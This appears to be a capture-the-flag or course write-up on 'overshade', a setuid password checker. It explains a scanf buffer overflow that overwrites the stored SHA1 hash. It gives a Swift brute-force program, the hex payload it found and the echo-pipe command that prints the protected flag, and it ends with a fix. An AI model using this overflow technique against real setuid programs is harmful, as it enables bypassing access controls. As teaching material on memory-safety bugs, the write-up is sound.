overshade
==============

Overview
--------
The program overshade is intended to only print the contents of the file `flag` if the hash of a given password matches a known hash.    
This means we have a simple password checking tool which restricts access to a read protected file
(can only be read by the program overshade due to the s bit) to users who know the password for it.


Vulnerability
-------------
scanf is given the format `%37s`, which means it will read up to 37 characters and try to write it into `password`.    
But as `password` is an array with only 20 bytes size, the other 17 bytes will overflow into `correct_hash`
(only because the program was compiled with `-fno-stack-protector` and we don't have a padding for password because of the `-m32` flag).    
So we can decide the first 17 bytes of a 20 bytes hash. The 18th byte will be 0x00 as scanf automatically appends the input with a null
terminator. The 19th and 20th bytes will be the same as before.    
We now only need to find a password which produces a hash with the given fixed last 3 bytes (this is called a miner in cryptocurrency contexts :))
and put the password we found together with the hash we found
(and seperate them with a null terminator after the password and fill the missing bytes in `password` so our hash really gets written into `correct_hash`).

Exploitation
------------
The only thing we have to do is write a program which randomly generates strings, computes the SHA1 hash for it and compares this hashes last 3 bytes
with our fixed 3 bytes. Once we got a correct hash we just have to output the password we found and our hash.    
Afterwards we just have to call `overshade` and provide it those both strings we found.    
To make it a little bit easier I fixed the random strings length to 19 so we don't have to fill it up with something.    
Also, our random strings and hashes are actually random bytes and can't be printed as ascii strings. Because of that
we will use echo with the flag -e and provide our bytes as hex encoded strings with \\x.    
The password I found, hex encoded, is `5d1eac5f10e322852eb64d028ccb6aeae83c75` and the sha1 hash of it is `fd8da5d230512f93cec76b36ccd45c84a100a450`.    
We can safely remove the last 3 bytes from the hash, as they will already be fixed inside the `correct_hash` array. Putting a `\x00` between those
two hex encoded strings and preceding all hex bytes with `\x` leads to the following string.    
`\x5d\x1e\xac\x5f\x10\xe3\x22\x85\x2e\xb6\x4d\x02\x8c\xcb\x6a\xea\xe8\x3c\x75\x00\xfd\x8d\xa5\xd2\x30\x51\x2f\x93\xce\xc7\x6b\x36\xcc\xd4\x5c\x84\xa1`    
We now only have to echo this and pipe it into `overshade` with the command:    
`echo -ne "\x5d\x1e\xac\x5f\x10\xe3\x22\x85\x2e\xb6\x4d\x02\x8c\xcb\x6a\xea\xe8\x3c\x75\x00\xfd\x8d\xa5\xd2\x30\x51\x2f\x93\xce\xc7\x6b\x36\xcc\xd4\x5c\x84\xa1" | ./overshade`    
We have to be inside the directory containing the program `overshade`. (The flag -n for echo only prevents a newline to be included.)    
Doing this gives us our flag!    
My program does the things I described above. It is written in Swift but could be converted 1:1 to C or Python or whatever language you want.
It just has to be able to compute an SHA1 hash of byte arrays. (see the source code below).    
```Swift
var hashed = false

var counter = 0
while !hashed {
    let password = Data([UInt8].secureRandom(count: 19)!)
    let hash = password.sha1()

    if counter % 10000 == 0 {
        print("COUNTER: \(counter)")
    }

    if hash[hash.count - 1] == 0x50 && hash[hash.count - 2] == 0xa4 && hash[hash.count - 3] == 0x00 {
        hashed = true
        print("PASSWORD: \(password.toHexString())")
        print("HASH: \(hash.toHexString())")
    }

    counter += 1
}
```    
(Imports are removed as they differ on macOS and Linux. Also the implementation of secureRandom is left out as it would make
this documentation unnecessarily large. secureRandom just reads bytes from `/dev/urandom`.)

Solution
--------
To fix this vulnerability, we simply have to change the line with scanf to `scanf("%19s", password);`.    
We need 19 there and not 20 as scanf automatically appends a null terminator at the end and our password
array has only 20 bytes space and would overflow otherwise. This is a fix if the required password is
not longer than 19 characters. If it is, the size of `password` has to be increased, as well as the scanf
format string accordingly.
